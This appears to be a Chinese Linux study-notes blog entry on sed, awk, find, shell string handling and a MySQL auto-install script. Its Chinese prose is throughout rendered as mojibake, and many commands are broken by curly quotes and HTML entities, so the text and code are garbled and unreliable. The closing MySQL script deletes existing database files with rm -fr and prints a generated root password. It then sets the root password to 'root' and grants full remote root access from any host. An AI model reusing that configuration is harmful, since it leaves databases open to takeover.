sed.txt ## (-e)é€‰é¡¹å…è®¸åœ¨åŒä¸€è¡Œé‡Œæ‰§è¡Œå¤šæ¡å‘½ä»¤ã€‚å¦‚ä¾‹å­æ‰€ç¤ºï¼Œç¬¬ä¸€æ¡å‘½ä»¤åˆ é™¤1è‡³5è¡Œï¼Œç¬¬äºŒæ¡å‘½ä»¤ç”¨helloæ›¿æ¢hiã€‚å‘½ä»¤çš„æ‰§è¡Œé¡ºåºå¯¹ç»“æœæœ‰å½±å“ã€‚å¦‚æœä¸¤ä¸ªå‘½ä»¤éƒ½æ˜¯æ›¿æ¢å‘½ä»¤ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªæ›¿æ¢å‘½ä»¤å°†å½±å“ç¬¬äºŒä¸ªæ›¿æ¢å‘½ä»¤çš„ç»“æœã€‚ sed â€“expression=â€™s/hello/hi/â€˜ â€“expression=â€™/today/dâ€™ sed.txt ## ä¸€ä¸ªæ¯”-eæ›´å¥½çš„å‘½ä»¤æ˜¯â€“expressionã€‚å®ƒèƒ½ç»™sedè¡¨è¾¾å¼èµ‹å€¼ã€‚ ä»æ–‡ä»¶è¯»å…¥ï¼šrå‘½ä»¤ sed â€˜/hello/r fileâ€™ sed.txt ## fileé‡Œçš„å†…å®¹è¢«è¯»è¿›æ¥ï¼Œæ˜¾ç¤ºåœ¨ä¸helloåŒ¹é…çš„è¡Œä¸‹é¢ï¼Œå¦‚æœåŒ¹é…å¤šè¡Œï¼Œåˆ™fileçš„å†…å®¹å°†æ˜¾ç¤ºåœ¨æ‰€æœ‰åŒ¹é…è¡Œçš„ä¸‹é¢ã€‚ å†™å…¥æ–‡ä»¶ï¼šwå‘½ä»¤ sed -n â€˜/hello/w fileâ€™ sed.txt ## åœ¨huangbo.txtä¸­æ‰€æœ‰åŒ…å«helloçš„è¡Œéƒ½è¢«å†™å…¥fileé‡Œã€‚ è¿½åŠ å‘½ä»¤ï¼šaå‘½ä»¤ sed â€˜/^hello/a\â€”&gt;this is a exampleâ€™ sed.txt ## â€˜â€”&gt;this is a exampleâ€™è¢«è¿½åŠ åˆ°ä»¥helloå¼€å¤´çš„è¡Œ(å¦èµ·ä¸€è¡Œ)åé¢ï¼Œsedè¦æ±‚å‘½ä»¤aåé¢æœ‰ä¸€ä¸ªåæ–œæ ã€‚ æ’å…¥ï¼šiå‘½ä»¤ sed â€˜/will/i\some thing new â€”â€”â€”â€”â€”â€”â€”â€”-â€˜ sed.txt ## å¦‚æœtestè¢«åŒ¹é…ï¼Œåˆ™æŠŠåæ–œæ åé¢çš„æ–‡æœ¬æ’å…¥åˆ°åŒ¹é…è¡Œçš„å‰é¢ã€‚ ä¸‹ä¸€ä¸ªï¼šnå‘½ä»¤ sed â€˜/hello/{n; s/aa/bb/;}â€™ sed.txt æ›¿æ¢ä¸‹ä¸€è¡Œçš„ç¬¬ä¸€ä¸ªaa sed â€˜/hello/{n; s/aa/bb/g;}â€™ sed.txt æ›¿æ¢ä¸‹ä¸€è¡Œçš„å…¨éƒ¨aa ## å¦‚æœhelloè¢«åŒ¹é…ï¼Œåˆ™ç§»åŠ¨åˆ°åŒ¹é…è¡Œçš„ä¸‹ä¸€è¡Œï¼Œæ›¿æ¢è¿™ä¸€è¡Œçš„aaï¼Œå˜ä¸ºbbï¼Œå¹¶æ‰“å°è¯¥è¡Œï¼Œç„¶åç»§ç»­ã€‚ é€€å‡ºï¼šqå‘½ä»¤ sed â€˜10qâ€™ sed.txt ## æ‰“å°å®Œç¬¬10è¡Œåï¼Œé€€å‡ºsedã€‚ åŒæ ·çš„å†™æ³•ï¼š sed -n â€˜1,10p â€˜ sed.txt awk(æŠ¥è¡¨ç”Ÿæˆå™¨)Awkæ˜¯ä¸€ä¸ªå¼ºå¤§çš„å¤„ç†æ–‡æœ¬çš„ç¼–ç¨‹è¯­è¨€å·¥å…·ï¼Œå…¶åç§°å¾—è‡ªäºå®ƒçš„åˆ›å§‹äººAlfred Ahoã€Peter Weinbergerå’ŒBrian Kernighan å§“æ°çš„é¦–ä¸ªå­—æ¯ï¼Œç›¸å¯¹äºgrepçš„æŸ¥æ‰¾ï¼Œsedçš„ç¼–è¾‘ï¼Œawkåœ¨å…¶å¯¹æ•°æ®åˆ†æå¹¶ç”ŸæˆæŠ¥å‘Šæ—¶ï¼Œæ˜¾å¾—å°¤ä¸ºå¼ºå¤§ã€‚AWK æä¾›äº†æå…¶å¼ºå¤§çš„åŠŸèƒ½ï¼šå¯ä»¥è¿›è¡Œæ ·å¼è£…å…¥ã€æµæ§åˆ¶ã€æ•°å­¦è¿ç®—ç¬¦ã€è¿›ç¨‹æ§åˆ¶è¯­å¥ç”šè‡³äºå†…ç½®çš„å˜é‡å’Œå‡½æ•°ã€‚ç®€å•æ¥è¯´awkå°±æ˜¯æ‰«ææ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œï¼ŒæŸ¥æ‰¾ä¸å‘½ä»¤è¡Œä¸­æ‰€ç»™å®šå†…å®¹ç›¸åŒ¹é…çš„æ¨¡å¼ã€‚å¦‚æœå‘ç°åŒ¹é…å†…å®¹ï¼Œåˆ™è¿›è¡Œä¸‹ä¸€ä¸ªç¼–ç¨‹æ­¥éª¤ã€‚å¦‚æœæ‰¾ä¸åˆ°åŒ¹é…å†…å®¹ï¼Œåˆ™ç»§ç»­å¤„ç†ä¸‹ä¸€è¡Œã€‚ è¯­æ³•12awk [options] 'script' var=value file(s)awk [options] -f scriptfile var=value file(s) â€¦ TODO å¾…è¡¥å…… å®ä¾‹ å‡è®¾last -n 5çš„è¾“å‡ºå¦‚ä¸‹: 123456root@cts1:~ # last -n 5root pts/1 192.168.170.1 Mon May 28 09:28 still logged inroot pts/1 192.168.170.1 Sun May 27 20:53 - 07:21 (10:28)root pts/0 192.168.170.1 Sun May 27 19:39 still logged inreboot system boot 2.6.32-573.el6.x Sun May 27 19:34 - 14:48 (19:13)root pts/1 192.168.170.1 Sat May 26 20:43 - 22:36 (01:53) åªæ˜¾ç¤ºäº”ä¸ªæœ€è¿‘ç™»å½•çš„è´¦å·ï¼š 12345678root@cts1:~ # last -n 5 | awk '&#123;print $1&#125;'rootrootrootrebootroot# awkå·¥ä½œæµç¨‹æ˜¯è¿™æ ·çš„ï¼šè¯»å…¥æœ‰'\n'æ¢è¡Œç¬¦åˆ†å‰²çš„ä¸€æ¡è®°å½•ï¼Œç„¶åå°†è®°å½•æŒ‰æŒ‡å®šçš„åŸŸåˆ†éš”ç¬¦åˆ’åˆ†åŸŸï¼Œå¡«å……åŸŸï¼Œ$0åˆ™è¡¨ç¤ºæ‰€æœ‰åŸŸ,$1è¡¨ç¤ºç¬¬ä¸€ä¸ªåŸŸ,$nè¡¨ç¤ºç¬¬nä¸ªåŸŸã€‚é»˜è®¤åŸŸåˆ†éš”ç¬¦æ˜¯"ç©ºç™½é”®" æˆ– "[tab]é”®",æ‰€ä»¥$1è¡¨ç¤ºç™»å½•ç”¨æˆ·ï¼Œ$3è¡¨ç¤ºç™»å½•ç”¨æˆ·ip,ä»¥æ­¤ç±»æ¨ æ˜¾ç¤º/etc/passwdçš„è´¦æˆ·ï¼š 12345678root@cts1:~ # cat /etc/passwd | awk -F':' '&#123;print $1&#125;'rootbindaemon...# è¿™ç§æ˜¯awk+actionçš„ç¤ºä¾‹ï¼Œæ¯è¡Œéƒ½ä¼šæ‰§è¡Œaction&#123;print $1&#125;ã€‚# -FæŒ‡å®šåŸŸåˆ†éš”ç¬¦ä¸º':' æ˜¾ç¤º/etc/passwdçš„è´¦æˆ·å’Œè´¦æˆ·å¯¹åº”çš„shell,è€Œè´¦æˆ·ä¸shellä¹‹é—´ä»¥tabé”®åˆ†å‰² 12345root@cts1:~ # cat /etc/passwd | awk -F':' '&#123;print $1"\t"$7&#125;'root /bin/zshbin /sbin/nologindaemon /sbin/nologin... BEGIN and END å¦‚æœåªæ˜¯æ˜¾ç¤º/etc/passwdçš„è´¦æˆ·å’Œè´¦æˆ·å¯¹åº”çš„shell,è€Œè´¦æˆ·ä¸shellä¹‹é—´ä»¥é€—å·åˆ†å‰²,è€Œä¸”åœ¨æ‰€æœ‰è¡Œæ·»åŠ åˆ—åname,shell,åœ¨æœ€åä¸€è¡Œæ·»åŠ â€blue,/bin/noshâ€ã€‚ 123456789101112131415161718root@cts1:~ # cat /etc/passwd |awk -F ':' 'BEGIN &#123;print "name,shell"&#125; &#123;print $1","$7&#125; END &#123;print "blue,/bin/nosh"&#125;'---name,shellroot,/bin/zshbin,/sbin/nologin...mysql,/bin/bashblue,/bin/nosh-------------------------root@cts1:~ # cat /etc/passwd | awk -F ':' 'BEGIN &#123;print "name \t shell"&#125; &#123;print$1"\t"$7&#125; END &#123;print "blue,/bin/bash"&#125;'---name shellroot /bin/zshbin /sbin/nologin...mysql /bin/bashblue,/bin/bash awkå·¥ä½œæµç¨‹æ˜¯è¿™æ ·çš„ï¼šå…ˆæ‰§è¡ŒBEGINï¼Œç„¶åè¯»å–æ–‡ä»¶ï¼Œè¯»å…¥æœ‰/næ¢è¡Œç¬¦åˆ†å‰²çš„ä¸€æ¡è®°å½•ï¼Œç„¶åå°†è®°å½•æŒ‰æŒ‡å®šçš„åŸŸåˆ†éš”ç¬¦åˆ’åˆ†åŸŸï¼Œå¡«å……åŸŸï¼Œ$0åˆ™è¡¨ç¤ºæ‰€æœ‰åŸŸ,$1è¡¨ç¤ºç¬¬ä¸€ä¸ªåŸŸ,$nè¡¨ç¤ºç¬¬nä¸ªåŸŸ,éšåå¼€å§‹æ‰§è¡Œæ¨¡å¼æ‰€å¯¹åº”çš„åŠ¨ä½œactionã€‚æ¥ç€å¼€å§‹è¯»å…¥ç¬¬äºŒæ¡è®°å½•â€¢â€¢â€¢â€¢â€¢â€¢ç›´åˆ°æ‰€æœ‰çš„è®°å½•éƒ½è¯»å®Œï¼Œæœ€åæ‰§è¡ŒENDæ“ä½œã€‚ æœç´¢/etc/passwdæœ‰rootå…³é”®å­—çš„æ‰€æœ‰è¡Œ 1234567891011121314151. root@cts1:~ # awk -F: '/root/' /etc/passwd --- root:x:0:0:root:/root:/bin/zsh operator:x:11:0:operator:/root:/sbin/nologin # è¿™ç§æ˜¯patternçš„ä½¿ç”¨ç¤ºä¾‹ï¼ŒåŒ¹é…äº†pattern(è¿™é‡Œæ˜¯root)çš„è¡Œæ‰ä¼šæ‰§è¡Œaction(æ²¡æœ‰æŒ‡å®šactionï¼Œé»˜è®¤è¾“å‡ºæ¯è¡Œçš„å†…å®¹)ã€‚2. æœç´¢æ”¯æŒæ­£åˆ™ï¼Œä¾‹å¦‚æ‰¾rootå¼€å¤´çš„: awk -F: '/^root/' /etc/passwd# æœç´¢/etc/passwdæœ‰rootå…³é”®å­—çš„æ‰€æœ‰è¡Œï¼Œå¹¶æ˜¾ç¤ºå¯¹åº”çš„shellroot@cts1:~ # awk -F ':' '/root/&#123;print $7&#125;' /etc/passwd/bin/zsh/sbin/nologin# è¿™é‡ŒæŒ‡å®šäº†action&#123;print $7&#125; awkå¸¸è§å†…ç½®å˜é‡ FILENAMEï¼šawkæµè§ˆçš„æ–‡ä»¶å FNRï¼šæµè§ˆæ–‡ä»¶çš„è®°å½•æ•°ï¼Œä¹Ÿå°±æ˜¯è¡Œæ•°ã€‚awkæ˜¯ä»¥è¡Œä¸ºå•ä½å¤„ç†çš„ï¼Œæ‰€ä»¥æ¯è¡Œå°±æ˜¯ä¸€ä¸ªè®°å½• NRï¼šawkè¯»å–æ–‡ä»¶æ¯è¡Œå†…å®¹æ—¶çš„è¡Œå· NFï¼šæµè§ˆè®°å½•çš„åŸŸçš„ä¸ªæ•°ã€‚å¯ä»¥ç”¨å®ƒæ¥è¾“å‡ºæœ€åä¸€ä¸ªåŸŸ FSï¼šè®¾ç½®è¾“å…¥åŸŸåˆ†éš”ç¬¦ï¼Œç­‰ä»·äºå‘½ä»¤è¡Œ-Fé€‰é¡¹ OFSï¼šè¾“å‡ºåŸŸåˆ†éš”ç¬¦ ç»Ÿè®¡/etc/passwd:æ–‡ä»¶åï¼Œæ¯è¡Œçš„è¡Œå·ï¼Œæ¯è¡Œçš„åˆ—æ•°ï¼Œå¯¹åº”çš„å®Œæ•´è¡Œå†…å®¹ 1234root@cts1:~ # awk -F ':' '&#123;print "filename:" FILENAME ",linenumber:" NR ",columns:" NF ",linecontent:"$0&#125;' /etc/passwd---filename:/etc/passwd,linenumber:1,columns:7,linecontent:root:x:0:0:root:/root:/bin/zshfilename:/etc/passwd,linenumber:2,columns:7,linecontent:bin:x:1:1:bin:/bin:/sbin/nologin ä½¿ç”¨printfæ›¿ä»£print,å¯ä»¥è®©ä»£ç æ›´åŠ ç®€æ´ï¼Œæ˜“è¯» 1234root@cts1:~ # awk -F ':' '&#123;printf("filename:%s,linenumber:%s,columns:%s,linecontent:%s\n",FILENAME,NR,NF,$0)&#125;' /etc/passwd---filename:/etc/passwd,linenumber:1,columns:7,linecontent:root:x:0:0:root:/root:/bin/zshfilename:/etc/passwd,linenumber:2,columns:7,linecontent:bin:x:1:1:bin:/bin:/sbin/nologin æŒ‡å®šè¾“å…¥åˆ†éš”ç¬¦ï¼ŒæŒ‡å®šè¾“å‡ºåˆ†éš”ç¬¦ï¼š 12345root@cts1:~ # awk 'BEGIN &#123;FS=":"; OFS="\t"&#125; &#123;print $1, $2&#125;' /etc/passwd---root xbin x... å®ç”¨ä¾‹å­ 1234567891011121314# Aï¼šæ‰“å°æœ€åä¸€åˆ—ï¼šawk -F: '&#123;print $NF&#125;' /etc/passwdawk -F: '&#123;printf("%s\n",$NF);&#125;' /etc/passwd# Bï¼šç»Ÿè®¡æ–‡ä»¶è¡Œæ•°ï¼šawk 'BEGIN &#123;x=0&#125; &#123;x++&#125; END &#123;print x&#125;' /etc/passwd# Cï¼šæ‰“å°9*9ä¹˜æ³•è¡¨ï¼šawk 'BEGIN&#123;for(n=0;n++&lt;9;)&#123;for(i=0;i++&lt;n;)printf i"*"n"="i*n" ";print ""&#125;&#125;'awk 'BEGIN &#123;for(i=1;i&lt;=9;i++)&#123;for(j=1;j&lt;=i;j++)&#123;printf i"*"j"="i*j" ";&#125;print ""&#125;&#125;'awk 'BEGIN &#123;for(i=9;i&gt;=1;i--)&#123;for(j=i;j&gt;=1;j--)&#123;printf i"*"j"="i*j" ";&#125;print ""&#125;&#125;'# D: è®¡ç®—1-100 ä¹‹å’Œecho "sum" | awk 'BEGIN &#123;sum=0;&#125; &#123;i=0;while(i&lt;101)&#123;sum+=i;i++&#125;&#125; END &#123;print sum&#125;' æ›´å¤šè¯¦ç»†ç”¨æ³•å‚è§å®˜ç½‘ findåŠŸèƒ½ï¼š æœç´¢æ–‡ä»¶ç›®å½•å±‚æ¬¡ç»“æ„ æ ¼å¼ï¼š find path -option actions find &lt;è·¯å¾„&gt; &lt;é€‰é¡¹&gt; [è¡¨è¾¾å¼] å¸¸ç”¨å¯é€‰é¡¹ï¼š1234567891011121314151617-name æ ¹æ®æ–‡ä»¶åæŸ¥æ‰¾ï¼Œæ”¯æŒ(\'\* \' , \'? \')-type æ ¹æ®æ–‡ä»¶ç±»å‹æŸ¥æ‰¾(f-æ™®é€šæ–‡ä»¶ï¼Œc-å­—ç¬¦è®¾å¤‡æ–‡ä»¶ï¼Œb-å—è®¾å¤‡æ–‡ä»¶ï¼Œl-é“¾æ¥æ–‡ä»¶ï¼Œd-ç›®å½•)-perm æ ¹æ®æ–‡ä»¶çš„æƒé™æŸ¥æ‰¾ï¼Œæ¯”å¦‚ 755-user æ ¹æ®æ–‡ä»¶æ‹¥æœ‰è€…æŸ¥æ‰¾-group æ ¹æ®æ–‡ä»¶æ‰€å±ç»„å¯»æ‰¾æ–‡ä»¶-size æ ¹æ®æ–‡ä»¶å°å¤§å¯»æ‰¾æ–‡ä»¶ -o è¡¨è¾¾å¼ æˆ–-a è¡¨è¾¾å¼ ä¸-not è¡¨è¾¾å¼ é ç±»å‹å‚æ•°åˆ—è¡¨ï¼š1234567- **f** æ™®é€šæ–‡ä»¶- **l** ç¬¦å·è¿æ¥- **d** ç›®å½•- **c** å­—ç¬¦è®¾å¤‡- **b** å—è®¾å¤‡- **s** å¥—æ¥å­—- **p** Fifo ç¤ºä¾‹1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556[linux@linux txt]$ ll ## å‡†å¤‡çš„æµ‹è¯•æ–‡ä»¶total 248-rw-rw-r--. 1 linux linux 235373 Apr 18 00:10 hw.txt-rw-rw-r--. 1 linux linux 0 Apr 22 05:43 LINUX.pdf-rw-rw-r--. 1 linux linux 3 Apr 22 05:50 liujialing.jpg-rw-rw-r--. 1 linux linux 0 Apr 22 05:43 mingxing.pdf-rw-rw-r--. 1 linux linux 57 Apr 22 04:40 mingxing.txt-rw-rw-r--. 1 linux linux 66 Apr 22 05:15 sort.txt-rw-rw-r--. 1 linux linux 214 Apr 18 10:08 test.txt-rw-rw-r--. 1 linux linux 24 Apr 22 05:27 uniq.txt[linux@linux txt]$ find /home/linux/txt/ -name "*.txt" ## æŸ¥æ‰¾æ–‡ä»¶åtxtç»“å°¾çš„æ–‡ä»¶/home/linux/txt/uniq.txt/home/linux/txt/mingxing.txt/home/linux/txt/test.txt/home/linux/txt/hw.txt/home/linux/txt/sort.txt## å¿½ç•¥å¤§å°å†™æŸ¥æ‰¾æ–‡ä»¶ååŒ…å«linux[linux@linux txt]$ find /home/linux/txt -iname "*linux*" /home/linux/txt/LINUX.pdf## æŸ¥æ‰¾æ–‡ä»¶åç»“å°¾æ˜¯.txtæˆ–è€….jpgçš„æ–‡ä»¶[linux@linux txt]$ find /home/linux/txt/ \( -name "*.txt" -o -name "*.jpg" \) /home/linux/txt/liujialing.jpg/home/linux/txt/uniq.txt/home/linux/txt/mingxing.txt/home/linux/txt/test.txt/home/linux/txt/hw.txt/home/linux/txt/sort.txtå¦ä¸€ç§å†™æ³•ï¼šfind /home/linux/txt/ -name "*.txt" -o -name "*.jpg"# ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼çš„æ–¹å¼å»æŸ¥æ‰¾ä¸Šé¢æ¡ä»¶çš„æ–‡ä»¶ï¼š[linux@linux txt]$ find /home/linux/txt/ -regex ".*\(\.txt\|\.jpg\)$"/home/linux/txt/liujialing.jpg/home/linux/txt/uniq.txt/home/linux/txt/mingxing.txt/home/linux/txt/test.txt/home/linux/txt/hw.txt/home/linux/txt/sort.txt## æŸ¥æ‰¾.jpgç»“å°¾çš„æ–‡ä»¶ï¼Œç„¶ååˆ æ‰[linux@linux txt]$ find /home/linux/txt -type f -name "*.jpg" -delete[linux@linux txt]$ lltotal 248-rw-rw-r--. 1 linux linux 235373 Apr 18 00:10 hw.txt-rw-rw-r--. 1 linux linux 0 Apr 22 05:43 LINUX.pdf-rw-rw-r--. 1 linux linux 0 Apr 22 05:43 mingxing.pdf-rw-rw-r--. 1 linux linux 57 Apr 22 04:40 mingxing.txt-rw-rw-r--. 1 linux linux 66 Apr 22 05:15 sort.txt-rw-rw-r--. 1 linux linux 214 Apr 18 10:08 test.txt-rw-rw-r--. 1 linux linux 24 Apr 22 05:27 uniq.txt## æŸ¥æ‰¾5å¤©ä»¥å†…åˆ›å»ºçš„ .sh æ–‡ä»¶, å¹¶æ˜¾ç¤ºåˆ›å»º/æ›´æ”¹æ—¶é—´find / -name "*sh" -mtime -5 |xargs ls -l 3. Shellæ“ä½œå­—ç¬¦ä¸²å­—ç¬¦ä¸²æˆªå–Linuxä¸­æ“ä½œå­—ç¬¦ä¸²ï¼Œä¹Ÿæ˜¯ä¸€é¡¹å¿…å¤‡çš„æŠ€èƒ½ã€‚å…¶ä¸­å°¤ä»¥æˆªå–å­—ç¬¦ä¸²æ›´åŠ é¢‘ç¹ï¼Œä¸‹é¢ä¸ºå¤§å®¶ä»‹ç»å‡ ç§å¸¸ç”¨æ–¹å¼ï¼Œæˆªå–å­—ç¬¦ä¸² é¢„å…ˆå®šä¹‰ä¸€ä¸ªå˜é‡ï¼šWEBSITE=â€™http://hadoop//centos/huangbo.html&#39; #æˆªå–ï¼Œ*ä»»æ„çš„, åˆ é™¤//å·¦è¾¹å­—ç¬¦ä¸²ï¼ˆåŒ…æ‹¬åˆ¶å®šçš„åˆ†éš”ç¬¦ï¼‰ï¼Œä¿ç•™å³è¾¹å­—ç¬¦ä¸² root@cts1:~ # echo ${WEBSITE#*//}hadoop//centos/huangbo.html ##æˆªå–ï¼Œåˆ é™¤å·¦è¾¹å­—ç¬¦ä¸²ï¼ˆåŒ…æ‹¬æŒ‡å®šçš„åˆ†éš”ç¬¦ï¼‰ï¼Œä¿ç•™å³è¾¹å­—ç¬¦ä¸²ï¼Œå’Œä¸Šè¾¹ä¸€ä¸ª#ä¸åŒçš„æ˜¯ï¼Œå®ƒä¸€ç›´æ‰¾åˆ°æœ€åï¼Œè€Œä¸æ˜¯åƒä¸€ä¸ª#é‚£æ ·æ‰¾åˆ°ä¸€ä¸ªå°±æ»¡è¶³æ¡ä»¶é€€å‡ºäº†ã€‚ root@cts1:~ # echo ${WEBSITE##*//}centos/huangbo.html %æˆªå–ï¼Œåˆ é™¤å³è¾¹å­—ç¬¦ä¸²ï¼ˆåŒ…æ‹¬åˆ¶å®šçš„åˆ†éš”ç¬¦ï¼‰ï¼Œä¿ç•™å·¦è¾¹å­—ç¬¦ä¸² root@cts1:~ # echo ${WEBSITE%//*}http://hadoop %%æˆªå–ï¼Œåˆ é™¤å³è¾¹å­—ç¬¦ä¸²ï¼ˆåŒ…æ‹¬æŒ‡å®šçš„åˆ†éš”ç¬¦ï¼‰ï¼Œä¿ç•™å·¦è¾¹å­—ç¬¦ä¸²ï¼Œå’Œä¸Šè¾¹ä¸€ä¸ª%ä¸åŒçš„æ˜¯ï¼Œå®ƒä¸€ç›´æ‰¾åˆ°æœ€å‰ï¼Œè€Œä¸æ˜¯åƒä¸€ä¸ª%é‚£æ ·æ‰¾åˆ°ä¸€ä¸ªå°±æ»¡è¶³æ¡ä»¶é€€å‡ºäº†ã€‚ root@cts1:~ # echo ${WEBSITE%%//*}http: ä»å·¦è¾¹ç¬¬å‡ ä¸ªå­—ç¬¦å¼€å§‹ï¼Œä»¥åŠæˆªå–çš„å­—ç¬¦çš„ä¸ªæ•° root@cts1:~ # echo ${WEBSITE:2:2}tp ä»å·¦è¾¹ç¬¬å‡ ä¸ªå­—ç¬¦å¼€å§‹ï¼Œä¸€ç›´åˆ°ç»“æŸ root@cts1:~ # echo ${WEBSITE:2}tp://hadoop//centos/huangbo.html ä»å³è¾¹ç¬¬å‡ ä¸ªå­—ç¬¦å¼€å§‹ï¼Œä»¥åŠå­—ç¬¦çš„ä¸ªæ•°, ä»-4å¼€å§‹, è¿˜æ˜¯å¾€å³è¾¹æˆªå– root@cts1:~ # echo ${WEBSITE:0-4:2 ht ä»å³è¾¹ç¬¬å‡ ä¸ªå­—ç¬¦å¼€å§‹ï¼Œä¸€ç›´åˆ°ç»“æŸ root@cts1:~ # echo ${WEBSITE:0-4}html åˆ©ç”¨awkè¿›è¡Œå­—ç¬¦ä¸²æˆªå– echo $WEBSITE | awk â€˜{print substr($1,2,6)}â€™ ttp:// åˆ©ç”¨cutè¿›è¡Œå­—ç¬¦ä¸²æˆªå– root@cts1:~ # echo $WEBSITE | cut -b 1-4 http è·å–æœ€åå‡ ä¸ªå­—ç¬¦ root@cts1:~ # echo ${WEBSITE:(-3)} tml æˆªå–ä»å€’æ•°ç¬¬3ä¸ªå­—ç¬¦åçš„2ä¸ªå­—ç¬¦ root@cts1:~ # echo ${WEBSITE:(-3):2}tm å­—ç¬¦ä¸²æ›¿æ¢ä½¿ç”¨æ ¼å¼ ${parameter/pattern/string} ä¾‹å­12345678910# å®šä¹‰å˜é‡VARï¼š[linux@linux ~]$ VAR="hello tom, hello kitty, hello xiaoming"# æ›¿æ¢ç¬¬ä¸€ä¸ªhello, ç”¨`/`ï¼š[linux@linux ~]$ echo $&#123;VAR/hello/hi&#125;hi tom, hello kitty, hello xiaoming# æ›¿æ¢æ‰€æœ‰hello, ç”¨'//'ï¼š[linux@linux ~]$ echo $&#123;VAR//hello/hi&#125;hi tom, hi kitty, hi xiaoming è·å–å­—ç¬¦ä¸²é•¿åº¦åœ¨æ­¤ä¸ºå¤§å®¶æä¾›äº”ç§æ–¹å¼è·å–æŸå­—ç¬¦ä¸²çš„é•¿åº¦ 123456789101112131415161718192021222324252627282930313233343536# åœ¨æ­¤ä¸ºå¤§å®¶æä¾›äº”ç§æ–¹å¼è·å–æŸå­—ç¬¦ä¸²çš„é•¿åº¦# 1. ä½¿ç”¨wc -Lå‘½ä»¤+----------------------------------------------------+| echo $&#123;WEBSITE&#125; |wc -L || || 35 |+----------------------------------------------------+# 2. ä½¿ç”¨exprçš„æ–¹å¼å»è®¡ç®—+---------------------------------------------------+| expr length $&#123;WEBSITE&#125; || || 35 |+---------------------------------------------------+# 3. é€šè¿‡awk + lengthçš„æ–¹å¼è·å–å­—ç¬¦ä¸²é•¿åº¦+---------------------------------------------------------------------------+|echo $&#123;WEBSITE&#125; | awk '&#123;print length($0)&#125;' || || 35 |+---------------------------------------------------------------------------+# 4. é€šè¿‡awkçš„æ–¹å¼è®¡ç®—ä»¥**\"\"**åˆ†éš”çš„å­—æ®µä¸ªæ•°+-------------------------------------------------------------------------+| echo $&#123;WEBSITE&#125; |awk -F "" '&#123;print NF&#125;' || || 35 |+-------------------------------------------------------------------------+# 5. é€šè¿‡\#çš„æ–¹å¼è·å–å­—ç¬¦ä¸²ï¼ˆæœ€ç®€å•ï¼Œæœ€å¸¸ç”¨ï¼‰+----------------------------------------------+| echo $&#123;#WEBSITE&#125; || || 35 |+----------------------------------------------+ 4. è„šæœ¬è‡ªåŠ¨å®‰è£…MySqlè¿™é‡Œå…ˆåšä¸ªè®°å½•, ä¹‹åä¼šæ•´ç†ä¸€ä»½æ›´è¯¦ç»†çš„æ–‡æ¡£å‡ºæ¥.1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/bin/bash## auto install mysql## å‡å¦‚æ˜¯ç¬¬äºŒæ¬¡è£…ï¼Œé‚£ä¹ˆè¦å…ˆåœæ‰æœåŠ¡ï¼Œå¹¶ä¸”å¸è½½ä¹‹å‰çš„mysqlservice mysql stopEXISTS_RPMS=`rpm -qa | grep -i mysql`echo $&#123;EXISTS_RPMS&#125;for RPM in $&#123;EXISTS_RPMS&#125;do rpm -e --nodeps $&#123;RPM&#125;done## åˆ é™¤æ®‹ç•™æ–‡ä»¶rm -fr /usr/lib/mysqlrm -fr /usr/include/mysqlrm -f /etc/my.cnfrm -fr /var/lib/mysql## ä»æœåŠ¡å™¨è·å–å®‰è£…mysqlçš„rpmåŒ…wget http://linux/soft/MySQL-client-5.6.26-1.linux_glibc2.5.x86_64.rpmwget http://linux/soft/MySQL-server-5.6.26-1.linux_glibc2.5.x86_64.rpm## åˆ é™¤ä¹‹å‰çš„å¯†ç æ–‡ä»¶ï¼Œä»¥å…äº§ç”Ÿå¹²æ‰°rm -rf /root/.mysql_secret## å®‰è£…æœåŠ¡å™¨rpm -ivh MySQL-server-5.6.26-1.linux_glibc2.5.x86_64.rpm## è·å–åˆ°ç”Ÿæˆçš„éšæœºå¯†ç ##PSWD=`cat /root/.mysql_secret | awk -F ':' '&#123;print substr($4,2,16)&#125;'`PSWD=` grep -v '^$' /root/.mysql_secret | awk -F ':' '&#123;print substr($4,2,16)&#125;'`##PSWD=$&#123;PWD:1:16&#125;## å®‰è£…å®¢æˆ·ç«¯rpm -ivh MySQL-client-5.6.26-1.linux_glibc2.5.x86_64.rpm## ç„¶ååˆ é™¤åˆšåˆšä¸‹ä¸‹æ¥çš„rpmåŒ…rm -rf MySQL-client-5.6.26-1.linux_glibc2.5.x86_64.rpmrm -rf MySQL-server-5.6.26-1.linux_glibc2.5.x86_64.rpm## æç¤ºå®‰è£…çš„æ­¥éª¤éƒ½å®Œæˆäº†ã€‚echo "install mysql server and client is done .!!!!!!"## æ‰“å°å‡ºæ¥åˆšåˆšç”Ÿæˆçš„mysqlåˆå§‹å¯†ç echo "random password is:$&#123;PSWD&#125;"## å¼€å¯mysqlæœåŠ¡service mysql start# æ‰‹åŠ¨ç¬¬ä¸€æ¬¡ç™»é™†ï¼Œç„¶åæ”¹æ‰å¯†ç [root@hadoop bin]# mysql -uroot -pZjVIWvOGD18bT7oXmysql&gt; set PASSWORD=PASSWORD('root');# ç°åœ¨å°±å¯ä»¥å†™è„šæœ¬é“¾æ¥mysqlè¿›è¡Œæ“ä½œäº†[root@hadoop bin]# vi initMysql.sh#!/bin/bashmysql -uroot -proot &lt;&lt; EOF GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION; FLUSH PRIVILEGES; use mysql; select host, user, password from user;EOF]]></content>
      <categories>
        <category>Linux</category>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>åŸåˆ›</tag>
        <tag>æŠ€æœ¯</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linuxå­¦ä¹ ç¬”è®°-4]]></title>
    <url>%2F2018%2F05%2F28%2FLinux%2FLinux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4%2F</url>
